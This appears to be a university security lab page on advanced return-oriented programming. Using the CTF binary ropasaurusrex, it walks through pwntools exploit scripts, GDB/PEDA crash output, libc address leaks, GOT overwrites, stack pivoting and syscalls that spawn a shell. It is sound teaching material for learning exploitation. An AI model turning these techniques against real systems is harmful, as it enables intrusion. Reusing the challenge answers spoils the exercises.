@@ -1,0 +1,479 @@
+# SOURCE: https://security.cs.pub.ro/summer-school/wiki/_export/raw/session/12
+# (fenced code blocks containing PEDA output, verbatim; blocks separated by a line "# ---- block ----")
+# ---- block ----
+====== 0x0B. Return Oriented Programming (advanced) ======
+
+===== Slides =====
+
+[[https://security.cs.pub.ro/summer-school/res/slides/12-return-oriented-programming-advanced.pdf|Session 12 slides]]
+
+[[https://security.cs.pub.ro/summer-school/res/arc/12-return-oriented-programming-advanced-skel.zip|Session's tutorials and challenges archive]]
+
+[[https://security.cs.pub.ro/summer-school/res/arc/12-return-oriented-programming-advanced-full.zip|Session's solutions]]
+
+===== Setup =====
+
+The ROPgadget version installed in the [[start|Kali virtual machine]] needs to be upgraded to work properly. Please use the command below (as ''root'') before starting this session and using ROPgadget:
+<code>
+pip install --upgrade ropgadget
+</code>
+
+In order to check if ''ROPgadget'' works properly, use
+<code>
+ROPgadget --binary /bin/false
+</code>
+
+===== Tutorials =====
+
+In this lab we are going to dive deeper into ROP (//Return Oriented Programming//) and setbacks that appear in modern exploitation. Topics covered:
+  * Intro to pwntools
+  * ROP Recap
+  * Dealing with ASLR in ROP in 2 ways
+  * Dealing with low space in the overflown buffer
+  * Dealing with bare bones executables
+  * ROP for syscalls and 64 bits
+
+As the basis of the lab we will use a CTF challenge called **ropasaurusrex** and gradually make exploitation harder.
+
+==== Calling Conventions in the ROP Context ====
+
+As you know, the [[:session:02#function-calls|calling convention for 32 bits]] uses the stack. This means that setting up parameters is as easy as just writing them in the payload.
+
+In the images below we are using the [[https://gcc.godbolt.org/|online Compiler Explorer]].
+
+{{ :session:32_func.png?direct |}}
+
+Syscalls are special, the arguments are passed using the registers and **int 0x80** or the equivalent **call DWORD PTR gs:0x10** is used such that more work is needed: "pop ?; ret" gadgets are needed to load the registers with the desired values.
+
+In the listing below you see a disassembly of the calling of a system call, with the system call in the ''eax'' register and the system call arguments in the other registers.
+
+<code asm>
+# See man 2 syscall
+
+gdb-peda$ pdis syscall
+Dump of assembler code for function syscall:
+   0x000e39e0 <+0>:	push   ebp
+   0x000e39e1 <+1>:	push   edi
+   0x000e39e2 <+2>:	push   esi
+   0x000e39e3 <+3>:	push   ebx
+   0x000e39e4 <+4>:	mov    ebp,DWORD PTR [esp+0x2c]
+   0x000e39e8 <+8>:	mov    edi,DWORD PTR [esp+0x28]
+   0x000e39ec <+12>:	mov    esi,DWORD PTR [esp+0x24]
+   0x000e39f0 <+16>:	mov    edx,DWORD PTR [esp+0x20]
+   0x000e39f4 <+20>:	mov    ecx,DWORD PTR [esp+0x1c]
+   0x000e39f8 <+24>:	mov    ebx,DWORD PTR [esp+0x18]
+   0x000e39fc <+28>:	mov    eax,DWORD PTR [esp+0x14]
+   0x000e3a00 <+32>:	call   DWORD PTR gs:0x10
+   0x000e3a07 <+39>:	pop    ebx
+   0x000e3a08 <+40>:	pop    esi
+   0x000e3a09 <+41>:	pop    edi
+   0x000e3a0a <+42>:	pop    ebp
+   0x000e3a0b <+43>:	cmp    eax,0xfffff001
+   0x000e3a10 <+48>:	jae    0xe3a13 <syscall+51>
+   0x000e3a12 <+50>:	ret
+</code>
+
+The same happens for 64 bit function calls:
+{{ :session:64_func.png?direct |}}
+
+Syscalls on 64 bits are similar. The ''syscall'' mnemonic is used for making a system call.
+
+<code asm>
+gdb-peda$ pdis syscall
+Dump of assembler code for function syscall:
+   0x00000000000e4ac0 <+0>:	mov    rax,rdi
+   0x00000000000e4ac3 <+3>:	mov    rdi,rsi
+   0x00000000000e4ac6 <+6>:	mov    rsi,rdx
+   0x00000000000e4ac9 <+9>:	mov    rdx,rcx
+   0x00000000000e4acc <+12>:	mov    r10,r8
+   0x00000000000e4acf <+15>:	mov    r8,r9
+   0x00000000000e4ad2 <+18>:	mov    r9,QWORD PTR [rsp+0x8]
+   0x00000000000e4ad7 <+23>:	syscall
+</code>
+
+
+==== Intro to pwntools ====
+
+Writing exploits in command line using expressions such as the following is prone to errors:
+
+<code sh>
+echo "AAAAAAAAAAAAAAAAAA\x43\x2a\x04\x08\x43\x2a\x04\x08\x43\x2a\x04\x08" | ./vuln
+</code>
+
+Writing the equivalent in Python is much simpler and more portable:
+<code python>
+gadget = 0x08042a43
+print "A" * 20 + struct.pack("<I", gadget)*3
+</code>
+
+However, exploitation rarely requires only a static payload. ASLR usually makes the exploit developer work harder and first obtain an info leak and then readjust the payload for that specific memory layout instance. To this end, some frameworks come to your aid to make life simpler. As seen in the previous sessions, [[http://pwntools.com/|pwntools]] is intended to make exploit writing as simple as possible and today we will focus on the following features:
+  * local exploitation / remote exploitation: https://github.com/binjitsu/tutorial/blob/master/tubes.md
+  * auto gdb attach: http://docs.pwntools.com/en/stable/gdb.html
+  * rop gadget search / rop chain assembly
+  * shellcode generation: http://docs.pwntools.com/en/stable/shellcraft.html
+  * plenty other
+
+Without using the advanced capabilities of pwntools a common exploit skeleton would look like the following:
+
+<code python>
+from pwn import *
+
+local = True
+
+if not local:
+	HOST = "host.name"
+	PORT = 4242
+	io = remote(HOST, PORT)
+else:
+	io = process("./vuln_binary")
+
+
+
+#write exploit
+ropchain = p32(system) + "JUNK" + p32(bin_sh)
+payload = "A" * 42 + p32(ebp) + ropchain
+
+#interact with the service
+io.recvuntil("What is your name?\n")
+
+#trigger
+io.sendline(payload)
+
+
+#switch to interactive input from the user to control the opened shell
+io.interactive()
+</code>
+
+In the snippet above the following happens:
+  - connect to either a local or remote process (using TCP)
+  - create the payload
+  - interact with the process using ''recvuntil'' and ''sendline'' functions
+
+==== Challenge 0 walkthrough ====
+
+Let's do a walkthrough/tutorial to work with the basic functionality of pwntools. We will use the first task and identify the vulnerability and write an exploit. For that change to the ''challenge-01/'' subfolder, and exploit the ''ropasaurusrex1'' executable in order to overflow the saved EBP, EIP and write the string //ELF// to standard output.
+
+First we need to look in the binary and observe the stack buffer overflow:
+<code>
+# objdump -d -M intel ropasaurusrex1
+[...]
+ 80483f4:	55                   	push   ebp
+ 80483f5:	89 e5                	mov    ebp,esp
+ 80483f7:	81 ec 98 00 00 00    	sub    esp,0x98
+ 80483fd:	c7 44 24 08 00 01 00 	mov    DWORD PTR [esp+0x8],0x100
+ 8048404:	00
+ 8048405:	8d 85 78 ff ff ff    	lea    eax,[ebp-0x88]
+ 804840b:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+ 804840f:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
+ 8048416:	e8 11 ff ff ff       	call   804832c <read@plt>
+ 804841b:	c9                   	leave
+ 804841c:	c3                   	ret
+[...]
+</code>
+
+We could do computations based on assembly output, but we can make things easier by using a cyclic pattern and obtain the offset to EBP:
+
+<code asm>
+# gdb -q ./ropasaurusrex1
+Reading symbols from ./ropasaurusrex1...(no debugging symbols found)...done.
+gdb-peda$ pattc 300
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
+gdb-peda$ run
+Starting program: /root/12-rop/skel/task-01/ropasaurusrex1
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x100
+EBX: 0x0
+ECX: 0xffffd5f0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+EDX: 0x100
+ESI: 0x1
+EDI: 0xf7fb0000 --> 0x1b3db0
+EBP: 0x41514141 ('AAQA')
+ESP: 0xffffd680 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+EIP: 0x41416d41 ('AmAA')
+EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41416d41
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd680 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0004| 0xffffd684 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0008| 0xffffd688 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0012| 0xffffd68c ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0016| 0xffffd690 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0020| 0xffffd694 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0024| 0xffffd698 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0028| 0xffffd69c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41416d41 in ?? ()
+gdb-peda$ patto $ebp
+1095844161 found at offset: 136
+
+gdb-peda$ searchmem "ELF"
+Searching for 'ELF' in: None ranges
+Found 23 results, display max 23 items:
+ropasaurusrex1 : 0x8048001 --> 0x1464c45
+ropasaurusrex1 : 0x8049001 --> 0x1464c45
+          libc : 0xf7dfc001 --> 0x1464c45
+        [vdso] : 0xf7fd8001 (inc    ebp)
+[...]
+gdb-peda$ x/s 0x8048001
+0x8048001:	"ELF\001\001\001"
+</code>
+
+We know the offset from the start of the buffer to the ''EBP'' address is ''136''.
+
+an address of the //ELF// string (''0x8048001''). From the disassembly above we know the address of the ''write'' stub in PLT: ''0x0804830c''. We want to use the function to write the //ELF// string to standard output. This basically means to call ''%%write(1, "ELF", 3)%%''.
+
+Let's use pwntools to construct the payload and exploit the executable. We create the ROP chain to call ''%%write(1, "ELF", 3)%%''.
+
+<code python>
+from pwn import *
+
+local = True
+
+if not local:
+    HOST = "host.name"
+    PORT = 4242
+    io = remote(HOST, PORT)
+else:
+    io = process("./ropasaurusrex1")
+
+
+# Create ROP chain.
+
+#  man 2 write:
+#     ssize_t write(int fd, const void *buf, size_t count);
+
+write_plt = 0x804830c
+fd = 1
+buf = 0x08048001
+count = 3
+ropchain = p32(write_plt) + "JUNK" + p32(fd) + p32(buf) + p32(count)
+
+
+# Create payload. Use junk value for EBP.
+ebp = 0x41424344
+payload = "A" * 136 + p32(ebp) + ropchain
+
+# Trigger exploit by sending payload to standard input.
+io.sendline(payload)
+
+
+# Print output as hex.
+rop_output = io.recv(3)
+print hexdump(rop_output)
+</code>
+
+The output is as expected:
+<code sh>
+[+] Started program './ropasaurusrex1'
+00000000  45 4c 46                                            │ELF│
+00000003
+[*] Program './ropasaurusrex1' stopped with exit code -11
+</code>
+
+
+===== Challenges =====
+
+==== 1. Challenge: Using ROP to Leak and Call system() ====
+
+Having completed the recap in the walkthrough above let's proceed to more advanced things. Use the ''task-01/ropasaurusrex1'' executable file and update the script above in order to spawn a shell.
+
+You can now call the functions in the binary but ''system()'' or any other appropriate function is missing and ASLR is enabled. How do you get past this? You need an information leak! To leak information we want to print it to standard output and process it. We use calls to ''printf()'', ''puts()'' or ''write()'' for this. In our case we can use the ''write()'' function call.
+
+<note>
+If you have a string representation of a number you can unpack it using the ''unpack()'' function in pwntools. It is the reverse of the ''p32()'' function.
+
+If you want to print a binary representation of a number you can use, in Python, for example
+<code>
+print "address: 0x%08x" % (addr)
+</code>
+
+If you want to make computations in the command line (such as subtracting an address from another address) you can use, for example
+<code>
+python -c 'print hex(0x0804830c - 0x08046920)'
+</code>
+</note>
+
+Follow the steps shown below.
+
+First, trigger the information leak by calling the ''write()'' function and leaking an address from ''libc''.
+
+<note tip>
+You can use the GOT table storing libc addresses.
+</note>
+
+You need to read the output from the above ''write()'' call. Use ''io.recv(4)'' in the Python program to read the 4 bytes output of the ''write()'' call in the ROP chain.
+
+<note tip>
+You need to discard from the stack the ''3'' arguments of the ''write()'' call before going to the next call. So you need to use a ''pop ? ; pop ? ; pop ? ; ret'' gadget. Use ''ROPgadget'' to locate a proper gadget.
+</note>
+
+Find the address of the ''system()'' call.
+
+<note tip>
+To find out the address of the ''system()'' call when you know the address of the ''puts()'' call, use [[https://github.com/razvand/snippets/blob/master/pwntools/exploit.py|this pwntools snippet]]. Check the last lines that compute the address of ''system()''
+</note>
+
+/*
+
+<note tip>
+As an alternative, more cumbersom method, fire up GDB on the libc library and save the offset of the function you want to leak and ''system()'':
+<code>
+root@kali:~/12-rop/skel/task-01# ldd ropasaurusrex1 
+	linux-gate.so.1 (0xf7780000)
+	libc.so.6 => /lib32/libc.so.6 (0xf75a4000)
+	/lib/ld-linux.so.2 (0x565cd000)
+root@kali:~/12-rop/skel/task-01# gdb -q /lib32/libc.so.6
+Reading symbols from /lib32/libc.so.6...(no debugging symbols found)...done.
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0x3ab20 <system>
+gdb-peda$ p read
+$2 = {<text variable, no debug info>} 0xd7d70 <read>
+gdb-peda$ p write
+$3 = {<text variable, no debug info>} 0xd7df0 <write>
+</code>
+
+Alternatively you can print addresses in GDB while investigating the ''ropasaurusrex1'' program and compute the offset difference.
+
+After the leak subtract the saved offset from it. You now have the libc base address (which should be aligned to a multiple of 0x1000). Use that address and add the other offset to compute the address of the ''system()'' call for the current run.
+</note>
+
+*/
+
+Call ''system()''.
+
+<note tip>
+You can't write the ''system()'' address in the ROP chain as it is different each time and the ROP chain is statically defined. You can use the GOT table again. Write an entry in the GOT table with the newly found address and call the function for that entry. It will evolve into a call to ''system()''.
+
+To write an entry in the GOT table use the ''read()'' call in the ROP chain. You will feed to ''read()'' the computed address below.
+
+For the actual parameter use the ''%%"sh"%%'' string already present in the vulnerable binary. Use ''searchmem'' in GDB to find the ''%%"sh"%%'' string in the executable.
+</note>
+==== 2. Challenge: Handling Low Stack Space ====
+
+The previous binary had the luxury of plenty of stack space to be overflown. It is often the case that we don't have enough space for a long ROP chain. Let's handle that.
+
+For the current task, switch to the ''task-23/'' sub-folder. The extra constraint here is that huge ropchains are no longer an option.
+
+Find out how much space you have in the overflow and assess the situation.
+
+<note tip>
+Use ''gdb'' and the cyclic pattern to get the information required.
+</note>
+
+Now follow the steps below.
+
+First trigger the info leak as before.
+
+<note tip>
+Use ''write()'' and leak the address of a GOT value. Use this to compute the address of the ''system()'' call.
+</note>
+
+You can only construct a partial ropchain. A longer one won't fit. So after calling ''write()'', call ''main()'' **again**.
+
+<note warning>
+Note that using ''sendline()'' means sending out a newline character (''\n'') at the end of the message. If you want to strictly send out a message without a newline, use ''send()''. See more here: https://github.com/binjitsu/tutorial/blob/master/tubes.md#basic-io
+</note>
+
+<note tip>
+Find the address of ''main()'' by looking at the argument for the ''%%__libc_start_main()%%'' function. Check the disassembling of the program and see what is the parameter passed to the ''%%__libc_start_main%%'' call.
+
+After calling main again you will get back to the initial situation where you can exploit the buffer overflow.
+</note>
+
+Call ''system()''. You know the address of the ''system()'' function from above.
+
+<note tip>
+Use a new ropchain to call ''%%system("sh")%%''. Use ''searchmem'' in GDB to locate the address of an ''sh'' string, same as the task above.
+</note>
+==== 3. Challenge: Stack Pivoting ====
+
+Let's assume that ''main()'' function had additional constraints that made it impossible to repeat the overflow. How can we still solve it? The method is called stack pivoting. In short, this means making the stack pointer refer another (writable) memory area that has enough space, a memory area that we will populate with the actual ROP chain.
+
+<note tip>
+Read more about stack pivoting here: http://neilscomputerblog.blogspot.ro/2012/06/stack-pivoting.html
+</note>
+
+Tour goal is to fill the actual ROP chain to a large enough memory area. We need a two stage exploit:
+  - In the first stage, prepare the memory area where to fill the second stage ROP chain; then fill the memory area with the second stage ROP chain.
+  - In the second stage, create the actual ROP chain and feed it to the program and profit.
+
+Follow the steps below.
+
+Use ''pmap'' or ''vmmap'' in GDB PEDA to discover the writable data section of the process. Select an address in that section (you may use the start address). This is where you fill the 2nd stage data (the actual ROP chain).
+
+Create a first stage payload that calls ''read()'' to store the 2nd stage data to the newly found memory area. After that pivot the stack pointer to the memory area address.
+
+<note tip>
+At a given address in the executable you have a call to ''read()'' followed by a ''leave'' and then a ''ret''. This sequence of instructions allows you to read data and then pivot the stack.
+
+The ''leave'' instruction fills the stack pointer (''esp'') with the address of the frame pointer (''ebp''). It's equivalent to
+<code>
+mov esp, ebp
+pop ebp
+</code>
+</note>
+
+Write the actual ROP chain as a second stage payload like when we didn't have space constraints. The 2nd stage will be stored to the memory area and the stack pointer will point to that.
+
+<note tip>
+Pay attention to how the 2nd stage payload should look like. The ''leave'' instruction is equivalent to
+<code>
+mov esp, ebp
+pop ebp
+</code>
+</note>
+
+/*==== 4. Challenge [Hard]: Change Memory Protection and Write Shellcode ====
+
+We want to exploit a more constrained environment. The constraint is to remove the ''system()'' call and use a statically linked executable with no connection to the standard C library or the ''system()'' call.
+
+Go the ''challenge-04/'' subfolder and first do a static and dynamic analysis of the ''ropasaurusrex4'' executable.
+
+<note important>
+Note how system calls are made, what registers need to be filled and the execution of the ''int 0x80'' instruction.
+</note>
+
+The idea is to change the memory protection of the data section of the executable such that it will also be executable. Then feed a shellcode to it to that now writable and executable memory are and execute the shellcode.
+
+Follow the steps below.
+
+Prepare for doing an ''mprotect'' system call. Devise a way to set all required registers (''eax'', ''ebx'', ''ecx'', ''edx'') to the proper value.
+
+<note tip>
+You can use a "fake" call to setup the ''ebx'', ''ecx'' and ''edx'' registers. Check the executable.
+
+You need a proper gadget to fill the value of ''eax'' to the ''mprotect'' system call number. Use the [[http://docs.pwntools.com/en/stable/constants.html|constants module in pwnlib]] to extract the ''mprotect'' system call number.
+</note>
+
+Call ''mprotect'' using a system call to set a memory zone to RWX permissions.
+
+<note tip>
+This relies on calling the ''mprotect'' system call using the previously filled register values. Use a gadget that calls ''int 0x80'' and the returns.
+</note>
+
+Read a shellcode to the now readable and executable memory area and execute it.
+
+<note tip>
+Use the [[http://docs.pwntools.com/en/stable/shellcraft.html|shellcraft module in pwnlib]] to create a shellcode and use the [[http://docs.pwntools.com/en/stable/asm.html|asm() function in pwnlib]] to assemble the shellcode.
+</note>
+*/
+
+==== 4. Challenge [Bonus] ====
+
+Switch to ''task-04''. You have a 64 bit binary that you need to exploit to execute /bin/date:
+  * First overflow the buffer and call vuln_gate. You will need to prepare registers for the 64 bit calling convention.
+  * Then overflow the second buffer and issue a syscall for **execve("/bin/sh", ["/bin/sh", "-c", "/bin/date"], NULL)**. You will need to prepare registers for the 64 bit syscall convention.
+  * Extra: Pop a shell.
+
+==== Resources: ====
+
+  * https://syscalls.kernelgrok.com/
+  * http://articles.manugarg.com/systemcallinlinux2_6.html
+  * https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries#the-procedure-linkage-table-plt
+  * https://github.com/Gallopsled/pwntools-tutorial/tree/master/walkthrough
